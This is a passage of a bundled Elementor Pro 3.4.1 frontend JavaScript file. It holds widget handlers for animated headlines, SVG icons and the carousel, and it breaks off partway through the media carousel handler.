/*! elementor-pro - v3.4.1 - 01-09-2021 */
(self["webpackChunkelementor_pro"] = self["webpackChunkelementor_pro"] || []).push([["preloaded-elements-handlers"],{

/***/ "../assets/dev/js/frontend/preloaded-elements-handlers.js":
/*!****************************************************************!*\
  !*** ../assets/dev/js/frontend/preloaded-elements-handlers.js ***!
  \****************************************************************/
/***/ ((__unused_webpack_module, __unused_webpack_exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

var _frontendLegacy = _interopRequireDefault(__webpack_require__(/*! modules/animated-headline/assets/js/frontend/frontend-legacy */ "../modules/animated-headline/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy2 = _interopRequireDefault(__webpack_require__(/*! modules/carousel/assets/js/frontend/frontend-legacy */ "../modules/carousel/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy3 = _interopRequireDefault(__webpack_require__(/*! modules/countdown/assets/js/frontend/frontend-legacy */ "../modules/countdown/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy4 = _interopRequireDefault(__webpack_require__(/*! modules/forms/assets/js/frontend/frontend-legacy */ "../modules/forms/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy5 = _interopRequireDefault(__webpack_require__(/*! modules/gallery/assets/js/frontend/frontend-legacy */ "../modules/gallery/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy6 = _interopRequireDefault(__webpack_require__(/*! modules/hotspot/assets/js/frontend/frontend-legacy */ "../modules/hotspot/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy7 = _interopRequireDefault(__webpack_require__(/*! modules/lottie/assets/js/frontend/frontend-legacy */ "../modules/lottie/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy8 = _interopRequireDefault(__webpack_require__(/*! modules/nav-menu/assets/js/frontend/frontend-legacy */ "../modules/nav-menu/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy9 = _interopRequireDefault(__webpack_require__(/*! modules/popup/assets/js/frontend/frontend-legacy */ "../modules/popup/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy10 = _interopRequireDefault(__webpack_require__(/*! modules/posts/assets/js/frontend/frontend-legacy */ "../modules/posts/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy11 = _interopRequireDefault(__webpack_require__(/*! modules/share-buttons/assets/js/frontend/frontend-legacy */ "../modules/share-buttons/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy12 = _interopRequireDefault(__webpack_require__(/*! modules/slides/assets/js/frontend/frontend-legacy */ "../modules/slides/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy13 = _interopRequireDefault(__webpack_require__(/*! modules/social/assets/js/frontend/frontend-legacy */ "../modules/social/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy14 = _interopRequireDefault(__webpack_require__(/*! modules/table-of-contents/assets/js/frontend/frontend-legacy */ "../modules/table-of-contents/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy15 = _interopRequireDefault(__webpack_require__(/*! modules/theme-builder/assets/js/frontend/frontend-legacy */ "../modules/theme-builder/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy16 = _interopRequireDefault(__webpack_require__(/*! modules/theme-elements/assets/js/frontend/frontend-legacy */ "../modules/theme-elements/assets/js/frontend/frontend-legacy.js"));

var _frontendLegacy17 = _interopRequireDefault(__webpack_require__(/*! modules/woocommerce/assets/js/frontend/frontend-legacy */ "../modules/woocommerce/assets/js/frontend/frontend-legacy.js"));

const extendDefaultHandlers = defaultHandlers => {
  const handlers = {
    animatedText: _frontendLegacy.default,
    carousel: _frontendLegacy2.default,
    countdown: _frontendLegacy3.default,
    form: _frontendLegacy4.default,
    gallery: _frontendLegacy5.default,
    hotspot: _frontendLegacy6.default,
    lottie: _frontendLegacy7.default,
    nav_menu: _frontendLegacy8.default,
    popup: _frontendLegacy9.default,
    posts: _frontendLegacy10.default,
    share_buttons: _frontendLegacy11.default,
    slides: _frontendLegacy12.default,
    social: _frontendLegacy13.default,
    themeBuilder: _frontendLegacy15.default,
    themeElements: _frontendLegacy16.default,
    woocommerce: _frontendLegacy17.default,
    tableOfContents: _frontendLegacy14.default
  };
  return { ...defaultHandlers,
    ...handlers
  };
};

elementorProFrontend.on('elementor-pro/modules/init:before', () => {
  elementorFrontend.hooks.addFilter('elementor-pro/frontend/handlers', extendDefaultHandlers);
});

/***/ }),

/***/ "../assets/dev/js/frontend/utils/icons/e-icons.js":
/*!********************************************************!*\
  !*** ../assets/dev/js/frontend/utils/icons/e-icons.js ***!
  \********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.close = void 0;

var _manager = _interopRequireDefault(__webpack_require__(/*! ./manager */ "../assets/dev/js/frontend/utils/icons/manager.js"));

// This file is automatically generated, please don't change anything in this file.
const iconsManager = new _manager.default('eicon');
const close = {
  get element() {
    const svgData = {
      path: 'M742 167L500 408 258 167C246 154 233 150 217 150 196 150 179 158 167 167 154 179 150 196 150 212 150 229 154 242 171 254L408 500 167 742C138 771 138 800 167 829 196 858 225 858 254 829L496 587 738 829C750 842 767 846 783 846 800 846 817 842 829 829 842 817 846 804 846 783 846 767 842 750 829 737L588 500 833 258C863 229 863 200 833 171 804 137 775 137 742 167Z',
      width: 1000,
      height: 1000
    };
    return iconsManager.createSvgElement('close', svgData);
  }

};
exports.close = close;

/***/ }),

/***/ "../assets/dev/js/frontend/utils/icons/manager.js":
/*!********************************************************!*\
  !*** ../assets/dev/js/frontend/utils/icons/manager.js ***!
  \********************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _defineProperty2 = _interopRequireDefault(__webpack_require__(/*! @babel/runtime/helpers/defineProperty */ "../node_modules/@babel/runtime/helpers/defineProperty.js"));

class IconsManager {
  constructor(elementsPrefix) {
    this.prefix = `${elementsPrefix}-`;

    if (!IconsManager.symbolsContainer) {
      const symbolsContainerId = 'e-font-icon-svg-symbols';
      IconsManager.symbolsContainer = document.getElementById(symbolsContainerId);

      if (!IconsManager.symbolsContainer) {
        IconsManager.symbolsContainer = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        IconsManager.symbolsContainer.setAttributeNS(null, 'style', 'display: none;');
        IconsManager.symbolsContainer.setAttributeNS(null, 'class', symbolsContainerId);
        document.body.appendChild(IconsManager.symbolsContainer);
      }
    }
  }

  createSvgElement(name, {
    path,
    width,
    height
  }) {
    const elementName = this.prefix + name,
          elementSelector = '#' + this.prefix + name; // Create symbol if not exist yet.

    if (!IconsManager.iconsUsageList.includes(elementName)) {
      if (!IconsManager.symbolsContainer.querySelector(elementSelector)) {
        const symbol = document.createElementNS('http://www.w3.org/2000/svg', 'symbol');
        symbol.id = elementName;
        symbol.innerHTML = '<path d="' + path + '"></path>';
        symbol.setAttributeNS(null, 'viewBox', '0 0 ' + width + ' ' + height);
        IconsManager.symbolsContainer.appendChild(symbol);
      }

      IconsManager.iconsUsageList.push(elementName);
    }

    const svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.innerHTML = '<use xlink:href="' + elementSelector + '" />';
    svg.setAttributeNS(null, 'class', 'e-font-icon-svg e-' + elementName);
    return svg;
  }

}

exports.default = IconsManager;
(0, _defineProperty2.default)(IconsManager, "symbolsContainer", void 0);
(0, _defineProperty2.default)(IconsManager, "iconsUsageList", []);

/***/ }),

/***/ "../assets/dev/js/frontend/utils/scroll.js":
/*!*************************************************!*\
  !*** ../assets/dev/js/frontend/utils/scroll.js ***!
  \*************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

if (window.elementorCommon) {
  window.elementorCommon.helpers.softDeprecated('Scroll util from "/dev/js/frontend/utils/scroll"', '3.1.0', 'elementorModules.utils.Scroll');
}

var _default = elementorModules.utils.Scroll;
exports.default = _default;

/***/ }),

/***/ "../modules/animated-headline/assets/js/frontend/frontend-legacy.js":
/*!**************************************************************************!*\
  !*** ../modules/animated-headline/assets/js/frontend/frontend-legacy.js ***!
  \**************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _animatedHeadlines = _interopRequireDefault(__webpack_require__(/*! ./handlers/animated-headlines */ "../modules/animated-headline/assets/js/frontend/handlers/animated-headlines.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('animated-headline', _animatedHeadlines.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/animated-headline/assets/js/frontend/handlers/animated-headlines.js":
/*!**************************************************************************************!*\
  !*** ../modules/animated-headline/assets/js/frontend/handlers/animated-headlines.js ***!
  \**************************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _scroll = _interopRequireDefault(__webpack_require__(/*! elementor-pro/frontend/utils/scroll */ "../assets/dev/js/frontend/utils/scroll.js"));

var _default = elementorModules.frontend.handlers.Base.extend({
  svgPaths: {
    circle: ['M325,18C228.7-8.3,118.5,8.3,78,21C22.4,38.4,4.6,54.6,5.6,77.6c1.4,32.4,52.2,54,142.6,63.7 c66.2,7.1,212.2,7.5,273.5-8.3c64.4-16.6,104.3-57.6,33.8-98.2C386.7-4.9,179.4-1.4,126.3,20.7'],
    underline_zigzag: ['M9.3,127.3c49.3-3,150.7-7.6,199.7-7.4c121.9,0.4,189.9,0.4,282.3,7.2C380.1,129.6,181.2,130.6,70,139 c82.6-2.9,254.2-1,335.9,1.3c-56,1.4-137.2-0.3-197.1,9'],
    x: ['M497.4,23.9C301.6,40,155.9,80.6,4,144.4', 'M14.1,27.6c204.5,20.3,393.8,74,467.3,111.7'],
    strikethrough: ['M3,75h493.5'],
    curly: ['M3,146.1c17.1-8.8,33.5-17.8,51.4-17.8c15.6,0,17.1,18.1,30.2,18.1c22.9,0,36-18.6,53.9-18.6 c17.1,0,21.3,18.5,37.5,18.5c21.3,0,31.8-18.6,49-18.6c22.1,0,18.8,18.8,36.8,18.8c18.8,0,37.5-18.6,49-18.6c20.4,0,17.1,19,36.8,19 c22.9,0,36.8-20.6,54.7-18.6c17.7,1.4,7.1,19.5,33.5,18.8c17.1,0,47.2-6.5,61.1-15.6'],
    diagonal: ['M13.5,15.5c131,13.7,289.3,55.5,475,125.5'],
    double: ['M8.4,143.1c14.2-8,97.6-8.8,200.6-9.2c122.3-0.4,287.5,7.2,287.5,7.2', 'M8,19.4c72.3-5.3,162-7.8,216-7.8c54,0,136.2,0,267,7.8'],
    double_underline: ['M5,125.4c30.5-3.8,137.9-7.6,177.3-7.6c117.2,0,252.2,4.7,312.7,7.6', 'M26.9,143.8c55.1-6.1,126-6.3,162.2-6.1c46.5,0.2,203.9,3.2,268.9,6.4'],
    underline: ['M7.7,145.6C109,125,299.9,116.2,401,121.3c42.1,2.2,87.6,11.8,87.3,25.7']
  },

  getDefaultSettings() {
    const iterationDelay = this.getElementSettings('rotate_iteration_delay'),
          settings = {
      animationDelay: iterationDelay || 2500,
      //letters effect
      lettersDelay: iterationDelay * 0.02 || 50,
      //typing effect
      typeLettersDelay: iterationDelay * 0.06 || 150,
      selectionDuration: iterationDelay * 0.2 || 500,
      //clip effect
      revealDuration: iterationDelay * 0.24 || 600,
      revealAnimationDelay: iterationDelay * 0.6 || 1500,
      // Highlighted headline
      highlightAnimationDuration: this.getElementSettings('highlight_animation_duration') || 1200,
      highlightAnimationDelay: this.getElementSettings('highlight_iteration_delay') || 8000
    };
    settings.typeAnimationDelay = settings.selectionDuration + 800;
    settings.selectors = {
      headline: '.elementor-headline',
      dynamicWrapper: '.elementor-headline-dynamic-wrapper',
      dynamicText: '.elementor-headline-dynamic-text'
    };
    settings.classes = {
      dynamicText: 'elementor-headline-dynamic-text',
      dynamicLetter: 'elementor-headline-dynamic-letter',
      textActive: 'elementor-headline-text-active',
      textInactive: 'elementor-headline-text-inactive',
      letters: 'elementor-headline-letters',
      animationIn: 'elementor-headline-animation-in',
      typeSelected: 'elementor-headline-typing-selected',
      activateHighlight: 'e-animated',
      hideHighlight: 'e-hide-highlight'
    };
    return settings;
  },

  getDefaultElements() {
    var selectors = this.getSettings('selectors');
    return {
      $headline: this.$element.find(selectors.headline),
      $dynamicWrapper: this.$element.find(selectors.dynamicWrapper),
      $dynamicText: this.$element.find(selectors.dynamicText)
    };
  },

  getNextWord($word) {
    return $word.is(':last-child') ? $word.parent().children().eq(0) : $word.next();
  },

  switchWord($oldWord, $newWord) {
    $oldWord.removeClass('elementor-headline-text-active').addClass('elementor-headline-text-inactive');
    $newWord.removeClass('elementor-headline-text-inactive').addClass('elementor-headline-text-active');
    this.setDynamicWrapperWidth($newWord);
  },

  singleLetters() {
    var classes = this.getSettings('classes');
    this.elements.$dynamicText.each(function () {
      var $word = jQuery(this),
          letters = $word.text().split(''),
          isActive = $word.hasClass(classes.textActive);
      $word.empty();
      letters.forEach(function (letter) {
        var $letter = jQuery('<span>', {
          class: classes.dynamicLetter
        }).text(letter);

        if (isActive) {
          $letter.addClass(classes.animationIn);
        }

        $word.append($letter);
      });
      $word.css('opacity', 1);
    });
  },

  showLetter($letter, $word, bool, duration) {
    var self = this,
        classes = this.getSettings('classes');
    $letter.addClass(classes.animationIn);

    if (!$letter.is(':last-child')) {
      setTimeout(function () {
        self.showLetter($letter.next(), $word, bool, duration);
      }, duration);
    } else if (!bool) {
      setTimeout(function () {
        self.hideWord($word);
      }, self.getSettings('animationDelay'));
    }
  },

  hideLetter($letter, $word, bool, duration) {
    var self = this,
        settings = this.getSettings();
    $letter.removeClass(settings.classes.animationIn);

    if (!$letter.is(':last-child')) {
      setTimeout(function () {
        self.hideLetter($letter.next(), $word, bool, duration);
      }, duration);
    } else if (bool) {
      setTimeout(function () {
        self.hideWord(self.getNextWord($word));
      }, self.getSettings('animationDelay'));
    }
  },

  showWord($word, $duration) {
    var self = this,
        settings = self.getSettings(),
        animationType = self.getElementSettings('animation_type');

    if ('typing' === animationType) {
      self.showLetter($word.find('.' + settings.classes.dynamicLetter).eq(0), $word, false, $duration);
      $word.addClass(settings.classes.textActive).removeClass(settings.classes.textInactive);
    } else if ('clip' === animationType) {
      self.elements.$dynamicWrapper.animate({
        width: $word.width() + 10
      }, settings.revealDuration, function () {
        setTimeout(function () {
          self.hideWord($word);
        }, settings.revealAnimationDelay);
      });
    }
  },

  hideWord($word) {
    var self = this,
        settings = self.getSettings(),
        classes = settings.classes,
        letterSelector = '.' + classes.dynamicLetter,
        animationType = self.getElementSettings('animation_type'),
        nextWord = self.getNextWord($word);

    if (!this.isLoopMode && $word.is(':last-child')) {
      return;
    }

    if ('typing' === animationType) {
      self.elements.$dynamicWrapper.addClass(classes.typeSelected);
      setTimeout(function () {
        self.elements.$dynamicWrapper.removeClass(classes.typeSelected);
        $word.addClass(settings.classes.textInactive).removeClass(classes.textActive).children(letterSelector).removeClass(classes.animationIn);
      }, settings.selectionDuration);
      setTimeout(function () {
        self.showWord(nextWord, settings.typeLettersDelay);
      }, settings.typeAnimationDelay);
    } else if (self.elements.$headline.hasClass(classes.letters)) {
      var bool = $word.children(letterSelector).length >= nextWord.children(letterSelector).length;
      self.hideLetter($word.find(letterSelector).eq(0), $word, bool, settings.lettersDelay);
      self.showLetter(nextWord.find(letterSelector).eq(0), nextWord, bool, settings.lettersDelay);
      self.setDynamicWrapperWidth(nextWord);
    } else if ('clip' === animationType) {
      self.elements.$dynamicWrapper.animate({
        width: '2px'
      }, settings.revealDuration, function () {
        self.switchWord($word, nextWord);
        self.showWord(nextWord);
      });
    } else {
      self.switchWord($word, nextWord);
      setTimeout(function () {
        self.hideWord(nextWord);
      }, settings.animationDelay);
    }
  },

  setDynamicWrapperWidth($word) {
    const animationType = this.getElementSettings('animation_type');

    if ('clip' !== animationType && 'typing' !== animationType) {
      this.elements.$dynamicWrapper.css('width', $word.width());
    }
  },

  animateHeadline() {
    var self = this,
        animationType = self.getElementSettings('animation_type'),
        $dynamicWrapper = self.elements.$dynamicWrapper;

    if ('clip' === animationType) {
      $dynamicWrapper.width($dynamicWrapper.width() + 10);
    } else if ('typing' !== animationType) {
      self.setDynamicWrapperWidth(self.elements.$dynamicText);
    } //trigger animation


    setTimeout(function () {
      self.hideWord(self.elements.$dynamicText.eq(0));
    }, self.getSettings('animationDelay'));
  },

  getSvgPaths(pathName) {
    var pathsInfo = this.svgPaths[pathName],
        $paths = jQuery();
    pathsInfo.forEach(function (pathInfo) {
      $paths = $paths.add(jQuery('<path>', {
        d: pathInfo
      }));
    });
    return $paths;
  },

  addHighlight() {
    const elementSettings = this.getElementSettings(),
          $svg = jQuery('<svg>', {
      xmlns: 'http://www.w3.org/2000/svg',
      viewBox: '0 0 500 150',
      preserveAspectRatio: 'none'
    }).html(this.getSvgPaths(elementSettings.marker));
    this.elements.$dynamicWrapper.append($svg[0].outerHTML);
  },

  rotateHeadline() {
    var settings = this.getSettings(); //insert <span> for each letter of a changing word

    if (this.elements.$headline.hasClass(settings.classes.letters)) {
      this.singleLetters();
    } //initialise headline animation


    this.animateHeadline();
  },

  initHeadline() {
    const headlineStyle = this.getElementSettings('headline_style');

    if ('rotate' === headlineStyle) {
      this.rotateHeadline();
    } else if ('highlight' === headlineStyle) {
      this.addHighlight();
      this.activateHighlightAnimation();
    }

    this.deactivateScrollListener();
  },

  activateHighlightAnimation() {
    const settings = this.getSettings(),
          classes = settings.classes,
          $headline = this.elements.$headline;
    $headline.removeClass(classes.hideHighlight).addClass(classes.activateHighlight);

    if (!this.isLoopMode) {
      return;
    }

    setTimeout(() => {
      $headline.removeClass(classes.activateHighligh).addClass(classes.hideHighlight);
    }, settings.highlightAnimationDuration + settings.highlightAnimationDelay * .8);
    setTimeout(() => {
      this.activateHighlightAnimation(false);
    }, settings.highlightAnimationDuration + settings.highlightAnimationDelay);
  },

  activateScrollListener() {
    const scrollBuffer = -100;
    this.intersectionObservers.startAnimation.observer = _scroll.default.scrollObserver({
      offset: `0px 0px ${scrollBuffer}px`,
      callback: event => {
        if (event.isInViewport) {
          this.initHeadline();
        }
      }
    });
    this.intersectionObservers.startAnimation.element = this.elements.$headline[0];
    this.intersectionObservers.startAnimation.observer.observe(this.intersectionObservers.startAnimation.element);
  },

  deactivateScrollListener() {
    this.intersectionObservers.startAnimation.observer.unobserve(this.intersectionObservers.startAnimation.element);
  },

  onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    this.intersectionObservers = {
      startAnimation: {
        observer: null,
        element: null
      }
    };
    this.isLoopMode = 'yes' === this.getElementSettings('loop');
    this.activateScrollListener();
  }

});

exports.default = _default;

/***/ }),

/***/ "../modules/carousel/assets/js/frontend/frontend-legacy.js":
/*!*****************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/frontend-legacy.js ***!
  \*****************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _mediaCarousel = _interopRequireDefault(__webpack_require__(/*! ./handlers/media-carousel */ "../modules/carousel/assets/js/frontend/handlers/media-carousel.js"));

var _testimonialCarousel = _interopRequireDefault(__webpack_require__(/*! ./handlers/testimonial-carousel */ "../modules/carousel/assets/js/frontend/handlers/testimonial-carousel.js"));

class _default extends elementorModules.Module {
  constructor() {
    super();
    elementorFrontend.elementsHandler.attachHandler('media-carousel', _mediaCarousel.default);
    elementorFrontend.elementsHandler.attachHandler('testimonial-carousel', _testimonialCarousel.default);
    elementorFrontend.elementsHandler.attachHandler('reviews', _testimonialCarousel.default);
  }

}

exports.default = _default;

/***/ }),

/***/ "../modules/carousel/assets/js/frontend/handlers/base.js":
/*!***************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/handlers/base.js ***!
  \***************************************************************/
/***/ ((__unused_webpack_module, exports) => {

"use strict";


Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

class CarouselBase extends elementorModules.frontend.handlers.SwiperBase {
  getDefaultSettings() {
    return {
      selectors: {
        swiperContainer: '.elementor-main-swiper',
        swiperSlide: '.swiper-slide'
      },
      slidesPerView: {
        widescreen: 3,
        desktop: 3,
        laptop: 3,
        tablet_extra: 3,
        tablet: 2,
        mobile_extra: 2,
        mobile: 1
      }
    };
  }

  getDefaultElements() {
    const selectors = this.getSettings('selectors'),
          elements = {
      $swiperContainer: this.$element.find(selectors.swiperContainer)
    };
    elements.$slides = elements.$swiperContainer.find(selectors.swiperSlide);
    return elements;
  }

  getEffect() {
    return this.getElementSettings('effect');
  }

  getDeviceSlidesPerView(device) {
    const slidesPerViewKey = 'slides_per_view' + ('desktop' === device ? '' : '_' + device);
    return Math.min(this.getSlidesCount(), +this.getElementSettings(slidesPerViewKey) || this.getSettings('slidesPerView')[device]);
  }

  getSlidesPerView(device) {
    if ('slide' === this.getEffect()) {
      return this.getDeviceSlidesPerView(device);
    }

    return 1;
  }

  getDeviceSlidesToScroll(device) {
    const slidesToScrollKey = 'slides_to_scroll' + ('desktop' === device ? '' : '_' + device);
    return Math.min(this.getSlidesCount(), +this.getElementSettings(slidesToScrollKey) || 1);
  }

  getSlidesToScroll(device) {
    if ('slide' === this.getEffect()) {
      return this.getDeviceSlidesToScroll(device);
    }

    return 1;
  }

  getSpaceBetween(device) {
    let propertyName = 'space_between';

    if (device && 'desktop' !== device) {
      propertyName += '_' + device;
    }

    return this.getElementSettings(propertyName).size || 0;
  }

  getSwiperOptions() {
    const elementSettings = this.getElementSettings();
    const swiperOptions = {
      grabCursor: true,
      initialSlide: this.getInitialSlide(),
      slidesPerView: this.getSlidesPerView('desktop'),
      slidesPerGroup: this.getSlidesToScroll('desktop'),
      spaceBetween: this.getSpaceBetween(),
      loop: 'yes' === elementSettings.loop,
      speed: elementSettings.speed,
      effect: this.getEffect(),
      preventClicksPropagation: false,
      slideToClickedSlide: true,
      handleElementorBreakpoints: true
    };

    if (elementSettings.show_arrows) {
      swiperOptions.navigation = {
        prevEl: '.elementor-swiper-button-prev',
        nextEl: '.elementor-swiper-button-next'
      };
    }

    if (elementSettings.pagination) {
      swiperOptions.pagination = {
        el: '.swiper-pagination',
        type: elementSettings.pagination,
        clickable: true
      };
    }

    if ('cube' !== this.getEffect()) {
      const breakpointsSettings = {},
            breakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      Object.keys(breakpoints).forEach(breakpointName => {
        breakpointsSettings[breakpoints[breakpointName].value] = {
          slidesPerView: this.getSlidesPerView(breakpointName),
          slidesPerGroup: this.getSlidesToScroll(breakpointName),
          spaceBetween: this.getSpaceBetween(breakpointName)
        };
      });
      swiperOptions.breakpoints = breakpointsSettings;
    }

    if (!this.isEdit && elementSettings.autoplay) {
      swiperOptions.autoplay = {
        delay: elementSettings.autoplay_speed,
        disableOnInteraction: !!elementSettings.pause_on_interaction
      };
    }

    return swiperOptions;
  }

  getDeviceBreakpointValue(device) {
    if (!this.breakpointsDictionary) {
      const breakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      this.breakpointsDictionary = {};
      Object.keys(breakpoints).forEach(breakpointName => {
        this.breakpointsDictionary[breakpointName] = breakpoints[breakpointName].value;
      });
    }

    return this.breakpointsDictionary[device];
  }

  updateSpaceBetween(propertyName) {
    const deviceMatch = propertyName.match('space_between_(.*)'),
          device = deviceMatch ? deviceMatch[1] : 'desktop',
          newSpaceBetween = this.getSpaceBetween(device);

    if ('desktop' !== device) {
      this.swiper.params.breakpoints[this.getDeviceBreakpointValue(device)].spaceBetween = newSpaceBetween;
    } else {
      this.swiper.params.spaceBetween = newSpaceBetween;
    }

    this.swiper.params.spaceBetween = newSpaceBetween;
    this.swiper.update();
  }

  async onInit() {
    elementorModules.frontend.handlers.Base.prototype.onInit.apply(this, arguments);
    const elementSettings = this.getElementSettings();

    if (1 >= this.getSlidesCount()) {
      return;
    }

    const Swiper = elementorFrontend.utils.swiper;
    this.swiper = await new Swiper(this.elements.$swiperContainer, this.getSwiperOptions());

    if ('yes' === elementSettings.pause_on_hover) {
      this.togglePauseOnHover(true);
    } // Expose the swiper instance in the frontend


    this.elements.$swiperContainer.data('swiper', this.swiper);
  }

  getChangeableProperties() {
    return {
      autoplay: 'autoplay',
      pause_on_hover: 'pauseOnHover',
      pause_on_interaction: 'disableOnInteraction',
      autoplay_speed: 'delay',
      speed: 'speed',
      width: 'width'
    };
  }

  updateSwiperOption(propertyName) {
    if (0 === propertyName.indexOf('width')) {
      this.swiper.update();
      return;
    }

    const elementSettings = this.getElementSettings(),
          newSettingValue = elementSettings[propertyName],
          changeableProperties = this.getChangeableProperties();
    let propertyToUpdate = changeableProperties[propertyName],
        valueToUpdate = newSettingValue; // Handle special cases where the value to update is not the value that the Swiper library accepts

    switch (propertyName) {
      case 'autoplay':
        if (newSettingValue) {
          valueToUpdate = {
            delay: elementSettings.autoplay_speed,
            disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
          };
        } else {
          valueToUpdate = false;
        }

        break;

      case 'autoplay_speed':
        propertyToUpdate = 'autoplay';
        valueToUpdate = {
          delay: newSettingValue,
          disableOnInteraction: 'yes' === elementSettings.pause_on_interaction
        };
        break;

      case 'pause_on_hover':
        this.togglePauseOnHover('yes' === newSettingValue);
        break;

      case 'pause_on_interaction':
        valueToUpdate = 'yes' === newSettingValue;
        break;
    } // 'pause_on_hover' is implemented by the handler with event listeners, not the Swiper library


    if ('pause_on_hover' !== propertyName) {
      this.swiper.params[propertyToUpdate] = valueToUpdate;
    }

    this.swiper.update();
  }

  onElementChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    if (0 === propertyName.indexOf('width')) {
      this.swiper.update(); // If there is another thumbs slider, like in the Media Carousel widget.

      if (this.thumbsSwiper) {
        this.thumbsSwiper.update();
      }

      return;
    } // This is for handling the responsive control 'space_between'.
    // Responsive controls require a separate way of handling, and some currently don't work
    // (Swiper bug, currently exists in v5.3.6) TODO: update Swiper when bug is fixed and handle responsive controls


    if (0 === propertyName.indexOf('space_between')) {
      this.updateSpaceBetween(propertyName);
      return;
    }

    const changeableProperties = this.getChangeableProperties();

    if (changeableProperties.hasOwnProperty(propertyName)) {
      this.updateSwiperOption(propertyName);
    }
  }

  onEditSettingsChange(propertyName) {
    if (1 >= this.getSlidesCount()) {
      return;
    }

    if ('activeItemIndex' === propertyName) {
      this.swiper.slideToLoop(this.getEditSettings('activeItemIndex') - 1);
    }
  }

}

exports.default = CarouselBase;

/***/ }),

/***/ "../modules/carousel/assets/js/frontend/handlers/media-carousel.js":
/*!*************************************************************************!*\
  !*** ../modules/carousel/assets/js/frontend/handlers/media-carousel.js ***!
  \*************************************************************************/
/***/ ((__unused_webpack_module, exports, __webpack_require__) => {

"use strict";


var _interopRequireDefault = __webpack_require__(/*! @babel/runtime/helpers/interopRequireDefault */ "../node_modules/@babel/runtime/helpers/interopRequireDefault.js");

Object.defineProperty(exports, "__esModule", ({
  value: true
}));
exports.default = void 0;

var _base = _interopRequireDefault(__webpack_require__(/*! ./base */ "../modules/carousel/assets/js/frontend/handlers/base.js"));

class MediaCarousel extends _base.default {
  isSlideshow() {
    return 'slideshow' === this.getElementSettings('skin');
  }

  getDefaultSettings(...args) {
    const defaultSettings = super.getDefaultSettings(...args);

    if (this.isSlideshow()) {
      defaultSettings.selectors.thumbsSwiper = '.elementor-thumbnails-swiper';
      defaultSettings.slidesPerView = {
        widescreen: 5,
        desktop: 5,
        laptop: 5,
        tablet_extra: 5,
        tablet: 4,
        mobile_extra: 4,
        mobile: 3
      };
    }

    return defaultSettings;
  }

  getSlidesPerViewSettingNames() {
    if (!this.slideshowElementSettings) {
      this.slideshowElementSettings = ['slides_per_view'];
      const activeBreakpoints = elementorFrontend.config.responsive.activeBreakpoints;
      Object.keys(activeBreakpoints).forEach(breakpointName => {
        this.slideshowElementSettings.push('slides_per_view_' + breakpointName);
      });
    }

    return this.slideshowElementSettings;
  }

  getElementSettings(setting) {
    if (-1 !== this.getSlidesPerViewSettingNames().indexOf(setting) && this.isSlideshow()) {
      setting = 'slideshow_' + setting;
    }

    return super.getElementSettings(setting);
  }

  getDefaultElements(...args) {
    const selectors = this.getSettings('selectors'),
          defaultElements = super.getDefaultElements(...args);

    if (this.isSlideshow()) {
      defaultElements.$thumbsSwiper = this.$element.find(selectors.thumbsSwiper);
    }

    return defaultElements;
  }

  getEffect() {
    if ('coverflow' === this.getElementSettings('skin')) {
      return 'coverflow';
    }

    return super.getEffect();
  }

  getSlidesPerView(device) {
    if (this.isSlideshow()) {
      return 1;
    }

    if ('coverflow' === this.getElementSettings('skin')) {
      return this.getDeviceSlidesPerView(device);
    }
